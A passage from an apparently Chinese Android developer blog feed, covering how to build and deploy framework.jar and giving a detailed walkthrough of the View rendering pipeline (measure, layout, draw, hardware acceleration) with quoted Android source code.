&#123;</span><br><span class="line">    name: &quot;framework&quot;,</span><br><span class="line">    defaults: [&quot;framework-aidl-export-defaults&quot;],</span><br><span class="line">    installable: false, // this lib is a build-only library</span><br><span class="line">    static_libs: [</span><br><span class="line">        &quot;app-compat-annotations&quot;,</span><br><span class="line">        &quot;framework-minus-apex&quot;,</span><br><span class="line">        &quot;framework-updatable-stubs-module_libs_api&quot;,</span><br><span class="line">    ],</span><br><span class="line">    sdk_version: &quot;core_platform&quot;,</span><br><span class="line">    apex_available: [&quot;//apex_available:platform&quot;],</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到模块名是framework，srcs下包括了很多目录下的java文件</p><p>然后通过make -j12 framework编译到out下:<br>out/target/product/xxx/system/framework/framework.jar</p><p>板子上的文件:<br>system/framework/framework.jar</p><p>1.可以拷贝到U盘后，通过命令 console:/ # cd mnt/media_rw/sda1/进入到U盘拷贝到板子<br>没有权限则执行 mount -o rw，remount /</p><p>2.可以adb push</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android View的渲染过程</title>
      <link href="/2023/08/12/2023-08-12/"/>
      <url>/2023/08/12/2023-08-12/</url>
      
        <content type="html"><![CDATA[<p>对于安卓开发猿来说，每天都会跟布局打交道，那么从我们写的一个布局文件，到运行后可视化的视图页面，这么长的时间内到底发生了啥呢？今天我们就一起来探询这一旅程。<br><img src="/images/20230812/20230812001.png"></p><h2 id="View-tree的创建过程"><a href="#View-tree的创建过程" class="headerlink" title="View tree的创建过程"></a>View tree的创建过程</h2><h3 id="布局文件的生成过程"><a href="#布局文件的生成过程" class="headerlink" title="布局文件的生成过程"></a>布局文件的生成过程</h3><p>一般情况下，一个布局写好了，如果不是特别复杂的布局，那么当把布局文件塞给Activity#setContentView或者一个Dialog或者一个Fragment，之后这个View tree就创建好了。那么setContentView，其实是通过LayoutInflater这个对象来具体的把一个布局文件转化为一个内存中的View tree的。这个对象不算太复杂，主要的逻辑就是解析XML文件，把每个TAG，用反射的方式来生成一个View对象，当XML文件解析完成后，一颗View tree就生成完了。</p><p>但是需要注意，inflate之后虽然View tree是创建好了，但是这仅仅是以单纯对象数据的形式存在，这时去获取View的一些GUI的相关属性，如大小，位置和渲染状态，是不存在的，或者是不对的。</p><h3 id="手动创建"><a href="#手动创建" class="headerlink" title="手动创建"></a>手动创建</h3><p>除了用布局文件来生成布局，当然也可以直接用代码来撸，这个就比较直观了，view tree就是你创建的，然后再把根节点塞给某个窗口，如Activity或者Dialog，那么view tree就创建完事了。</p><h2 id="渲染前的准备工作"><a href="#渲染前的准备工作" class="headerlink" title="渲染前的准备工作"></a>渲染前的准备工作</h2><p>View tree生成的最后一步就是把根结点送到ViewRootImpl#setView里面，这里会把view添加到wms之中，并着手开始渲染，接下来就主要看ViewRootImpl这个类了，主要入口方法就是ViewRootImpl#requestLayout，然后是scheduleTraversals()，这里会把请求放入到队列之中，最终执行渲染的是doTraversal，它里面调用的是performTraversals()，所以，我们需要重点查看ViewRootImpl#performTraversals这个方法，view tree渲染的流程全在这里面。这个方法相当之长，接近1000行，主要就是三个方法performMeasure，performLayout和performDraw，就是常说的三大步：measure，layout和draw。</p><h2 id="渲染之measure"><a href="#渲染之measure" class="headerlink" title="渲染之measure"></a>渲染之measure</h2><p>就看performMeasure方法，这个方法很简单，就是调用了根view的measure方法，然后传入widthSpec和heightSpec。measure的目的就是测量view tree的大小，就是说view tree在用户可视化角度所占屏幕大小。要想理解透彻measure，需要理解三个事情，MeasureSpec，View#measure方法和View#onMeasure方法：</p><h2 id="理解MeasureSpec"><a href="#理解MeasureSpec" class="headerlink" title="理解MeasureSpec"></a>理解MeasureSpec</h2><p>从文档中可以了解到，MeasureSpec是从父布局传给子布局，用以代表父布局对子布局在宽度和高度上的约束，它有两部分一个是mode，一个是对应的size，打包成一个integer。</p><h3 id="UNSPECIFIED"><a href="#UNSPECIFIED" class="headerlink" title="UNSPECIFIED"></a>UNSPECIFIED</h3><p>父布局对子布局没有要求，子布局可以设置任意大小，这个 基本上 不常见。</p><h3 id="EXACTLY"><a href="#EXACTLY" class="headerlink" title="EXACTLY"></a>EXACTLY</h3><p>父布局已经计算好了一个精确的大小，子布局要严格按照 这个来。</p><h3 id="AT-MOST"><a href="#AT-MOST" class="headerlink" title="AT_MOST"></a>AT_MOST</h3><p>子布局最大可以达到传过来的这个尺寸。</p><p>光看这几个mode，还是不太好理解。因为我们平日里写布局，在大小（或者说宽和高）这块就三种写法：一个是MATCH_PARENT，也就是要跟父布局一样大；要么是WRAP_CONTENT，也就是说子布局想要刚好合适够显示自己就行了；再者就是写死的如100dp等。需要把measure时的mode与LayoutParams结合联系起来，才能更好的理解measure的过程。</p><p>还是得从performMeasure这时入手，这个MeasureSpec是由父节点传给子节点，追根溯源，最原始的肯定是传给整个view tree根节点的，也就是调用performMeasure时传入的参数值。</p><h3 id="根节点的MeasureSpec"><a href="#根节点的MeasureSpec" class="headerlink" title="根节点的MeasureSpec"></a>根节点的MeasureSpec</h3><p>根节点的MeasureSpec是由getRootMeasureSpec得来的，这个方法传入的是窗口的大小，这是由窗口来给出的，当前的窗口肯定 是知道自己的大小的，以及根节点布局中写的大小。从这个方法就能看出前面说的布局中的三种写法对MeasureSpec的影响了：</p><ul><li>如果 根节点布局是MATCH_PARENT的，那么 mode就是EXACTLY，大小就是父布局的尺寸，因为根节点的父亲就是窗口，所以就是窗口的大小</li><li>如果 根节点布局是WRAP_CONTENT的，那么 mode是AT_MOST，大小依然会是父布局的尺寸。这个要这样理解，WRAP_CONTENT是想让子布局自己决定自己多大，但是，你的极限 就是父布局的大小了。</li><li>其他，其实就是根节点写死了大小的（写布局时是必须 要指定layout_width和layout_height的，即使某些view可以省略一个，也是因为缺省值，而并非不用指定），那么mode会是EXACTLY，大小用根节点指定的值。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getRootMeasureSpec</span><span class="params">(<span class="type">int</span> windowSize, <span class="type">int</span> rootDimension)</span> &#123;</span><br><span class="line">    <span class="type">int</span> measureSpec;</span><br><span class="line">    <span class="keyword">switch</span> (rootDimension) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ViewGroup.LayoutParams.MATCH_PARENT:</span><br><span class="line">        <span class="comment">// Window can&#x27;t resize. Force root view to be windowSize.</span></span><br><span class="line">        measureSpec = MeasureSpec.makeMeasureSpec(windowSize, MeasureSpec.EXACTLY);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ViewGroup.LayoutParams.WRAP_CONTENT:</span><br><span class="line">        <span class="comment">// Window can resize. Set max size for root view.</span></span><br><span class="line">        measureSpec = MeasureSpec.makeMeasureSpec(windowSize, MeasureSpec.AT_MOST);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// Window wants to be an exact size. Force root view to be that size.</span></span><br><span class="line">        measureSpec = MeasureSpec.makeMeasureSpec(rootDimension, MeasureSpec.EXACTLY);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> measureSpec;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="子View的MeasureSpec"><a href="#子View的MeasureSpec" class="headerlink" title="子View的MeasureSpec"></a>子View的MeasureSpec</h3><p>MeasureSpec这个东西是自上而下的，从根节点向子View传递。前面看过了根节点的spec生成方式，还有必要再看一下子View在measure过程中是如何生成spec的，以更好的理解整体过程。主要看ViewGroup#getChildMeasureSpec方法就可以了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getChildMeasureSpec</span><span class="params">(<span class="type">int</span> spec, <span class="type">int</span> padding, <span class="type">int</span> childDimension)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">specMode</span> <span class="operator">=</span> MeasureSpec.getMode(spec);</span><br><span class="line">    <span class="type">int</span> <span class="variable">specSize</span> <span class="operator">=</span> MeasureSpec.getSize(spec);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> Math.max(<span class="number">0</span>, specSize - padding);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">resultSize</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">resultMode</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (specMode) &#123;</span><br><span class="line">    <span class="comment">// Parent has imposed an exact size on us</span></span><br><span class="line">    <span class="keyword">case</span> MeasureSpec.EXACTLY:</span><br><span class="line">        <span class="keyword">if</span> (childDimension &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            resultSize = childDimension;</span><br><span class="line">            resultMode = MeasureSpec.EXACTLY;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (childDimension == LayoutParams.MATCH_PARENT) &#123;</span><br><span class="line">            <span class="comment">// Child wants to be our size. So be it.</span></span><br><span class="line">            resultSize = size;</span><br><span class="line">            resultMode = MeasureSpec.EXACTLY;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (childDimension == LayoutParams.WRAP_CONTENT) &#123;</span><br><span class="line">            <span class="comment">// Child wants to determine its own size. It can&#x27;t be</span></span><br><span class="line">            <span class="comment">// bigger than us.</span></span><br><span class="line">            resultSize = size;</span><br><span class="line">            resultMode = MeasureSpec.AT_MOST;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Parent has imposed a maximum size on us</span></span><br><span class="line">    <span class="keyword">case</span> MeasureSpec.AT_MOST:</span><br><span class="line">        <span class="keyword">if</span> (childDimension &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// Child wants a specific size... so be it</span></span><br><span class="line">            resultSize = childDimension;</span><br><span class="line">            resultMode = MeasureSpec.EXACTLY;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (childDimension == LayoutParams.MATCH_PARENT) &#123;</span><br><span class="line">            <span class="comment">// Child wants to be our size, but our size is not fixed.</span></span><br><span class="line">            <span class="comment">// Constrain child to not be bigger than us.</span></span><br><span class="line">            resultSize = size;</span><br><span class="line">            resultMode = MeasureSpec.AT_MOST;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (childDimension == LayoutParams.WRAP_CONTENT) &#123;</span><br><span class="line">            <span class="comment">// Child wants to determine its own size. It can&#x27;t be</span></span><br><span class="line">            <span class="comment">// bigger than us.</span></span><br><span class="line">            resultSize = size;</span><br><span class="line">            resultMode = MeasureSpec.AT_MOST;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Parent asked to see how big we want to be</span></span><br><span class="line">    <span class="keyword">case</span> MeasureSpec.UNSPECIFIED:</span><br><span class="line">        <span class="keyword">if</span> (childDimension &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// Child wants a specific size... let them have it</span></span><br><span class="line">            resultSize = childDimension;</span><br><span class="line">            resultMode = MeasureSpec.EXACTLY;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (childDimension == LayoutParams.MATCH_PARENT) &#123;</span><br><span class="line">            <span class="comment">// Child wants to be our size... find out how big it should</span></span><br><span class="line">            <span class="comment">// be</span></span><br><span class="line">            resultSize = View.sUseZeroUnspecifiedMeasureSpec ? <span class="number">0</span> : size;</span><br><span class="line">            resultMode = MeasureSpec.UNSPECIFIED;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (childDimension == LayoutParams.WRAP_CONTENT) &#123;</span><br><span class="line">            <span class="comment">// Child wants to determine its own size.... find out how</span></span><br><span class="line">            <span class="comment">// big it should be</span></span><br><span class="line">            resultSize = View.sUseZeroUnspecifiedMeasureSpec ? <span class="number">0</span> : size;</span><br><span class="line">            resultMode = MeasureSpec.UNSPECIFIED;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//noinspection ResourceType</span></span><br><span class="line">    <span class="keyword">return</span> MeasureSpec.makeMeasureSpec(resultSize, resultMode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>单纯从spec角度来理解，与上面的是一样的，基本上WRAP_CONTENT会是AT_MOST，而其他都是EXACTLY。</p><p>后面会再详细讨论一下，父布局与子View的相互影响。</p><h2 id="View-measure和View-onMeasure"><a href="#View-measure和View-onMeasure" class="headerlink" title="View#measure和View#onMeasure"></a>View#measure和View#onMeasure</h2><p>performMeasure比较简单，只是调用根节点的measure方法，然后把计算出来的根节点的MeasureSpec传进去，就完事了，所以 重点要View#measure方法。这里需要注意的是整个View的设计体系里面一些主要的逻辑流程是不允许子类override的，可定制的部分作被动式的方法嵌入在主要逻辑流程中，如measure是不能被override的，它会调用可以被子类override的onMeasure。onMeasure是每个View必须实现的方法，用传入的父布局的约束来计算出自已的大小。</p><p>为了优化measure流程，还有一个cache机制，用从父布局传入的MeasureSpec作为key，从onMeasure得出的结果 作为value，保存在cache中，当后面再次调用measure时，如果MeasureSpec未发生变化，那么就直接从cache中取出结果，如果 有变化 那么再调用onMeasure去计算一次。光看View#measure和onMeasure这两个方法也没啥啊，或者说常见的view或者我们自己定义的view的onMeasure方法也没啥啊，都不算太复杂，有同学就会问，这里为啥这么费劲 非要搞出一个cache呢？这个也好理解，要明白任何一个view不光是你自己，还涉及到所有你的子view啊，如果你只是一个未端的view（叶子），那当然 无所谓了，但如果是一个ViewGroup，下面有很多个子view，那么 如果能少调用一次onMeasure，还是能节省不少CPU资源的。</p><h2 id="ViewGroup的onMeasure"><a href="#ViewGroup的onMeasure" class="headerlink" title="ViewGroup的onMeasure"></a>ViewGroup的onMeasure</h2><p>每个View的本身的onMeasure并不复杂，只需要关注好本身的尺寸就好了。</p><p>复杂的在于ViewGroup的onMeasure，简单来理解也并不复杂，它除了需要测量自己的宽与高之外，还需要逐个遍历子view以measure子view。如果ViewGroup自身是EACTLY的，那么onMeasure过程就会简单不少，因为它自身的宽与高是确定的，只需要挨个measure子View就可了，而且子View并不影响它本身。当然，要把padding和margin考虑进来。</p><p>最为复杂的就是AT_MOST，ViewGroup自身的宽与高是由其所有子View决定的，这才是最复杂的，也是各个ViewGroup子类布局器需要重点解决的，而且过程各不相同，因为每个布局器的特点不一样，所以过程并不相同，下面来各自讨论一下。</p><h2 id="几种常见的ViewGroup的measure逻辑"><a href="#几种常见的ViewGroup的measure逻辑" class="headerlink" title="几种常见的ViewGroup的measure逻辑"></a>几种常见的ViewGroup的measure逻辑</h2><p>下来来看一下一些非常常见的ViewGroup是如何measure的：</p><h3 id="LinearLayout"><a href="#LinearLayout" class="headerlink" title="LinearLayout"></a>LinearLayout</h3><p>它的方向只有两个，可以只分析一个方向，另外一个方向是差不多的，我们就看看measureVertical。</p><p>第1种情况，也就是height mode是EXACTLY的时候，这个时候LinearLayout布局本身的高度是已知的，挨个遍历子view然后measure一下就可以。</p><p>第2种情况，比较复杂的情况，是AT_MOST时，这其实也还好，理论上高度就是所有子view的高度之和。</p><p>对于LinearLayout，最为复杂的情况是处理weight，这需要很多复杂处理，要把剩余所有的空间按weight来分配，具体比较复杂，有兴趣的可以具体去看源码。这也说明了，为何在线性布局中使用weight会影响性能，代码中就可以看出当有weight要处理的时候，至少多遍历一遍子view以进行相关的计算。</p><p>虽然方向是VERTICAL时，重点只处理垂直方向，但是width也是需要计算的，但width的处理就要简单得多，如果其是EXACTLY的，那么就已知了；如果是AT_MOST的，就要找子view中width的最大值。</p><h3 id="FrameLayout"><a href="#FrameLayout" class="headerlink" title="FrameLayout"></a>FrameLayout</h3><p>FrameLayout其实是最简单的一个布局管理器，因为它对子view是没有约束的，无论水平方向还是垂直方向，对子view都是没有约束，所以它的measure过程最简单。</p><p>如果是EXACTLY的，它本身的高度与宽度是确定的，那么就遍历子view，measure一下就可以了，最后再把margin和padding加一下就完事了。</p><p>如果是AT_MOST的，那么也不难，遍历子View并measure，然后取子view中最大宽为它的宽度，取最大的高为其高度，再加上margin和padding，基本上就做完了。</p><p>因为，FrameLayout的measure过程最为简单，因此系统里很多地方默认用的就是FrameLayout，比如窗口里的root view。</p><h3 id="RelativeLayout"><a href="#RelativeLayout" class="headerlink" title="RelativeLayout"></a>RelativeLayout</h3><p>这个是最为复杂的，从设计的目的来看，RelativeLayout要解决的问题也是提供了长与宽两个维度来约束子view。</p><p>总体过的过程就是要分别从vertical方向和horizontal方向，来进行两遍的measure，同时还要计算具体的坐标，实际上RelativeLayout的measure过程是把measure和layout一起做了。</p><h2 id="自定义View如何实现onMeasure"><a href="#自定义View如何实现onMeasure" class="headerlink" title="自定义View如何实现onMeasure"></a>自定义View如何实现onMeasure</h2><p>如果是一个具体的View，那就相当简单了，默认的实现就可以了。</p><p>如果是ViewGroup会相对复杂一些，取决于如何从水平和垂直方向上约束子view，然后进行遍历，并把约束考虑进去。可以参考LinearLayout和RelativeLayout的onMeasure实现。</p><h3 id="渲染之layout"><a href="#渲染之layout" class="headerlink" title="渲染之layout"></a>渲染之layout</h3><p>measure是确定控件的尺寸，下一步就是layout，也就是对控件进行排列。</p><p>首先，需要理解现代GUI窗口的坐标系统，假设屏幕高为height，宽为width，那么屏幕左上角为坐标原点（0，0），右下角为（width, height），屏幕从上向下为Y轴方向，从左向右则是X轴方向。安卓当中，也是如此。每一个控件都是一个矩形区域，为了能知道如何渲染每一块矩形（每 一个控件）就需要知道它的坐标，在前一步measure中，能知道它的宽与高，如果再能确定它的起始坐标左上角，那么它在整个屏幕中的位置就可以确定了。</p><p>对于Android来说，view的渲染的第二步骤就是layout，其目的就是要确定好它的坐标，每一个View都有四个变量mLeft, mTop，mRight和mBottom，(mLeft, mTop)是它的左上角，(mRight, mBottom）是它的右下角，很明显width=mRight-mLeft，而height=mBottom-mTop。这些数值是相对于父布局来说的，每个View都是存在于view tree之中，知道相对于父布局的数值就足够在渲染时使用了，没必要用相对屏幕的绝对数值，而且用相对父布局的坐标数值再加上父布局的坐标，就可以得到在屏幕上的绝对数值，如果需要这样做的话。</p><p><img src="/images/20230812/20230812002.jpg"></p><p>layout过程依然是从根节点开始的，所以仍要从ViewRootImpl#performLayout作为起点来理顺layout的逻辑。performLayout的参数是一个LayoutParam，以及一个windowWidth和desiredWindowHeight，调用performLayout是在performTraversal当中，在做完performMeasure时，传入的参数其实就是窗口window的宽与高（因为毕竟是根节点嘛）。performLayout中会从根节点mView开开对整个view tree进行layout，其实就是调用mView.layout，传入的是0, 0和view的经过measure后宽与高。</p><p>单个View的layout方法实现较简单，把传入的参数保存到mLeft,mTop,mRight和mBottom变量，再调用onLayout就完事了，这个很好理解，因为子view是由父布局确定好的位置，只要在measure过程把自己需要的大小告诉父布局后，父布局会根据LayoutParam做安排，传给子view的就是计算过后的结果，每个子view记录一下结果就可以了，不需要做啥额外的事情。</p><p>ViewGroup稍复杂，因为它要处理其子view，并且要根据其设计的特点对子view进行约束排列。还是可以看看常见的三个ViewGroup是如何做layout的。</p><h3 id="LinearLayout-1"><a href="#LinearLayout-1" class="headerlink" title="LinearLayout"></a>LinearLayout</h3><p>依然是两个方向，因为LinearLayout的目的就是在某一个方向上对子view进行约束。看layoutVertical就可以了，水平方向上逻辑是一样的。</p><p>遍历一次子View即可，从父布局的left, top起始，考虑子view的height 以及上下的padding和margin，依次排列就可以了。需要注意的是，对于left的处理，理论上子view的left就应该等于父布局，因为这毕竟是vertical的，水平上是没有约束的，但是也要考虑Gravity，当然也要把padding和margin考虑进来。最后通过setChildFrame把排列好的坐标设置给子view。</p><p>总体来看，线性布局的layout过程比其measure过程要简单不少。</p><h3 id="FrameLayout-1"><a href="#FrameLayout-1" class="headerlink" title="FrameLayout"></a>FrameLayout</h3><p>FrameLayout对子view的排列其实是没有约束的，所以layout过程也不复杂，遍历子view，子view的left和top初始均为父布局，依据其Gravity来做一下排布即可，比如如果Gravity是right，那么子view就要从父布局的右侧开始计算，childRight=parentRight-margin-padding，childLeft=childRight-childWidth，以次类推，还是比较好理解的。</p><h3 id="RelativeLayout-1"><a href="#RelativeLayout-1" class="headerlink" title="RelativeLayout"></a>RelativeLayout</h3><p>前面提到过RelativeLayout是在measure的时候就把坐标都计算好了，它的layout就是把坐标设置给子view，其余啥也没有。</p><h3 id="自定义View如何实现onLayout"><a href="#自定义View如何实现onLayout" class="headerlink" title="自定义View如何实现onLayout"></a>自定义View如何实现onLayout</h3><p>如果是自定义View的话，不需要做什么。</p><p>如果是自定义的ViewGroup的话，要看设计的目的，是如何排列子view的。</p><p>总之，layout过程相较measure过程还是比较好理解的，约束规则越复杂的view，其measure过程越复杂，但layout过程却不复杂。</p><h2 id="渲染之draw"><a href="#渲染之draw" class="headerlink" title="渲染之draw"></a>渲染之draw</h2><p>draw是整个渲染过程的核心也是最复杂的一步，前面的measure和layout只能算作准备，draw才会真正进行绘制。</p><h3 id="draw的整个逻辑流程"><a href="#draw的整个逻辑流程" class="headerlink" title="draw的整个逻辑流程"></a>draw的整个逻辑流程</h3><p>与measure和layout的过程非常不一样，虽然在performTraversals中也会调用performDraw，也就是说看似draw流程的起点仍是ViewRootImpl#performDraw，但查看一下这个方法的实现就可以发现，这里面其实并没有调用到View#draw，就是说它其实也是做一些准备工作，整个View tree的draw触发，并不在这里。</p><p>从performDraw中并没有做直接与draw相关的事情，它会调用另外一个方法draw()来做此事情，在draw方法中，它会先计算需要渲染的区域（dirty区域），然后再针对 此区域做渲染，正常情况下会走硬件加速方式去渲染，这部分比较复杂，它直接与一个叫做ThreadedRenderer打交道，稍后再作分析。</p><p>由于各种原因，假如硬件加速未没有成功，那么会走到软件渲染，这部分逻辑相对清晰一些，可以先从这里看起，会直接调用到drawSoftware()，这个方法有助于我们看清楚渲染的流程。这个方法里面会创建一个Canvas对象，是由ViewRootImpl持有的一个Surface对象中创建出来的，并调用view tree根节点的mView.draw(canvas)，由此便把流程转移到了view tree上面。</p><h3 id="view-tree的draw的过程"><a href="#view-tree的draw的过程" class="headerlink" title="view tree的draw的过程"></a>view tree的draw的过程</h3><p>ViewRootImpl是直接调用根节点的draw方法，那么这里便是整个view tree的入口。可先从View#draw(canvas）方法看起。主要分为四步：1）画背景drawBackground；2）画自己的内容通过onDraw来委派，具体的内容是在onDraw里面做的；3）画子view，通过dispatchDraw方法；4）画其他的东西，如scroll bar或者focus highlight等。可以重点关注一下这些操作的顺序，先画背景，然后画自己，然后画子view，最后画scroll bar和focus之类的东西。</p><p>重点来看看dispatchDraw方法，因为其他几个都相对非常好理解，这个方法主要要靠ViewGroup来实现，因为在View里面它是空的，节点自己只需要管自己就可以了，只有父节点才需要关注如何画子View。ViewGroup#dispatchDraw这个方法做一些准备工作，如把padding考虑进来并进行clip，后会遍历子View，针对 每个子view调用drawChild方法，这实际上就 是调用回了View#draw(canvas，parent，drawingTime)方法，注意这个方法是package scope的，也就是说只能供view框架内部调用。这个方法并没有做具体的渲染工作（因为每个View的具体渲染都是在onDraw里面做的），这个方法里面做了大量与动画相关的各种变换。</p><h3 id="Canvas对象是从哪里来的"><a href="#Canvas对象是从哪里来的" class="headerlink" title="Canvas对象是从哪里来的"></a>Canvas对象是从哪里来的</h3><p>View的渲染过程其实大都是GUI框架内部的逻辑流程控制，真正涉及graphics方面的具体的图形如何画出来，其实都是由Canvas对象来做的，比如如何画点，如何画线，如何画文字，如何画图片等等。一个Canvas对象从ViewRootImpl传给View tree，就在view tree中一层一层的传递，每个view都把其想要展示的内容渲染到Canvas对象中去。</p><p>那么，这个Canvas对象又是从何而来的呢？从view tree的一些方法中可以看到，都是从外面传进来的，view tree的各个方法（draw, dipsatchDraw和drawChild）都只接收Canvas对象，但并不创建它。</p><p>从上面的逻辑可以看到Canvas对象有二个来源：一是在ViewRootImpl中创建的，当走软件渲染时，会用Surface创建出一个Canvas对象，然后传给view tree。从ViewRootImpl的代码来看，它本身就会持有一个Surface对象，大概的逻辑就是每一个Window对象内，都会有一个用来渲染的Surface；</p><p>另外一个来源就是走硬件加速时，会由hwui创建出Canvas对象。</p><h3 id="draw过程的触发逻辑"><a href="#draw过程的触发逻辑" class="headerlink" title="draw过程的触发逻辑"></a>draw过程的触发逻辑</h3><p>从上面的讨论中可以看出draw的触发逻辑有两条路：</p><p>一是，没有启用硬件加速时，走的软件draw流程，也是一条比较好理解的简单流程：performTraversal-&gt;performDraw-&gt;draw-&gt;drawSoftware-&gt;View#draw。</p><p>二是，启用了硬件加速时，走的是performTraversal-&gt;performDraw-&gt;draw-&gt;ThreadedRenderer#draw，到这里就走进了硬件加速相关的逻辑了。</p><h2 id="硬件加速"><a href="#硬件加速" class="headerlink" title="硬件加速"></a>硬件加速</h2><p>硬件加速是从Android 4.0开始支持的，在此之前都是走的软件渲染，也就是从ViewRoot（4.0版本以前是叫ViewRoot，后来才是ViewRootImpl）中持有的Surface直接创建Canvas，然后传给view tree去做具体的渲染，与前面提到的drawSoftware过程类似。</p><p>硬件加速则要复杂得多，多了好多东西，它又搞出了一套渲染架构，但这套东西是直接与GPU联系，有点类似于OpenGL，把view tree的渲染转换成为一系列命令，直接传给GPU，软件渲染则是需要CPU把所有的运算都做了，最终生成graphic buffer送给屏幕（当然也是GPU）。</p><p>这一坨东西中最为核心就是RenderNode和RecordingCanvas。其中RenderNode是纯新的东西，它是为了构建 一个render tree（类似于view tree），用以构建复杂的渲染逻辑关系。RecordingCanvas是Canvas的一个子类，它是专门用于硬件加速渲染的，但又为了兼容老的Canvas（软件渲染），为啥叫recording呢？因为硬件加速方式渲染，对于view tree的draw过程来说就是记录一系列的操作，这其实就是给GPU的指令，渲染的最后一步就是把整个render tree丢给GPU，就完了。</p><p>前面说的两个是数据结构，还不够，还有HardwareRenderer和ThreadedRenderer，这两个用来建立和管理render tree的，也就是说它们内部管理着一组由RenderNode组成的render tree，并且做一些上下文环境的初始化与清理资源的工作。类似于OpenGL中GLSurfaceView的RenderThread做的事情。</p><p>硬件加速与原框架的切入点都是RenderNode和RecordingCanvas，View类中多了一个RenderNode成员，当draw的时候，从RenderNode中得到RecordingCanvas，其余操作都与原来一致，都是调用Canvas的方法进行graphics的绘制，这样整体渲染流程就走入到了硬件加速里面。</p><h2 id="Choreographer与vsync"><a href="#Choreographer与vsync" class="headerlink" title="Choreographer与vsync"></a>Choreographer与vsync</h2><p>虽然在Android 4.0版本加入了硬件加速的支持，但这还是不够，因为它只是相当于具体的渲染时间可能快了一些，举例来说，可能是普通火车与高铁之间的差异，虽然确实行程所花时间变短了，但是对于整体的效率来说提升并不大。对于整体GUI的流畅度，响应度，特别是动画这一块的流程程度与其他平台（如水果）差距仍是巨大的。一个最重要的原因就在于，GUI整体的渲染流程是缺少协同的，仍是按需式渲染：应用层布局加载完了要渲染了，或者ViewRootImpl发现dirty了，需要重绘了，或者有用户事件了需要响应了，触发整体渲染流程，更新graphic buffer，屏幕刷新了。</p><p>这一过程其实也没有啥大问题，对于常规的UI显示，没有问题，我没有更新，没有变化 ，当然 不需要重绘了，如果有更新有变化时再按需重新渲染，这显然 没有什么问题。最大的问题在于动画，动画是要求连续不停的重绘，如果仅靠客户这一端（相较于graphic 